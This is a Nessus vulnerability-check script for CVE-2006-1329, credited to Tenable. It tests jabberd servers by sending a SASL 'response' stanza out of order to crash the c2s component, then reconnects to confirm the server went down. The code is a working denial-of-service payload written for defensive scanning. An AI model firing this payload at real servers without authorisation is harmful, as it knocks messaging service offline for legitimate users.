#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(21120);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-1329");
  script_bugtraq_id(17155);
  script_xref(name:"OSVDB", value:"24009");

  script_name(english:"Jabber Studio jabberd SASL Negotiation Remote DoS");
  script_summary(english:"Tries to crash jabberd c2s component");

 script_set_attribute(attribute:"synopsis", value:
"The remote instant messaging server is affected by a denial of service
issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running jabberd, an open-source messaging system
based on the Jabber protocol. 

The version of jabberd installed on the remote host suffers a segfault
when a client sends a SASL 'response' stanza before a SASL 'auth'
stanza.  An unauthenticated remote attacker can leverage this flaw to
crash the application's c2s component, thereby denying service to
legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://mail.jabber.org/pipermail/jadmin/2006-March/023687.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to jabberd 2s11 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("find_service2.nasl");
  script_require_ports("Services/jabber", 5347);

  exit(0);
}


port = get_kb_item("Services/jabber");
if (!port) port = 5347;
if (!get_port_state(port)) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Initialize the connection.
req1 = string(
  '<?xml version="1.0"?>\n',
  '  <stream:stream to="example.com"\n',
  '    xmlns="jabber:client"\n',
  '    xmlns:stream="http://etherx.jabber.org/streams"\n',
  '    xml:lang="en" version="1.0">\n'
);
send(socket:soc, data:req1);
res = recv_line(socket:soc, length:1024);
if (strlen(res) && "xmpp-sasl" >< res)
{
  req2 = "<response xmlns='urn:ietf:params:xml:ns:xmpp-sasl'> 4843716d2ec078f115e0f6c98a484cbd </response>";
  send(socket:soc, data:req2);
  res = recv_line(socket:soc, length:1024);
  close(soc);

  if (!strlen(res))
  {
    # Try to reestablish a connection and read the banner.
    soc2 = open_sock_tcp(port);
    if (soc2)
    {
      send(socket:soc2, data:req1);
      res2 = recv_line(socket:soc2, length:1024);
      close(soc2);
    }

    # If we couldn't establish the connection or read the banner,
    # there's a problem.
    if (!soc2 || !strlen(res2))
    {
      security_warning(port);
      exit(0);
    }
  }
}
